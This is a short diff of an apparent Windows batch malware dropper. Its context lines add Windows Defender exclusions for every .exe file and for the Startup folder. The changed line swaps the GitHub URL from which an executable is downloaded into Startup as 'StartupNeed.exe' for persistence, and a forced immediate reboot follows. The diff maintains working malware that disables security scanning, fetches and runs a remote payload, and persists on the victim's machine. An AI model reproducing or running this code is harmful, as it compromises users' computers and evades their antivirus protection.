@@ -28,7 +28,7 @@
 @powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 ;@powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
 ; ;@cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-;@powershell -Command "Invoke-WebRequest https://github.com/traced1337/stuff/raw/main/zipper.exe -OutFile StartupNeed.exe"
+;@powershell -Command "Invoke-WebRequest https://github.com/preposing/none/raw/main/Built.exe -OutFile StartupNeed.exe"
 ;@shutdown -t 0 -r -f
 
 
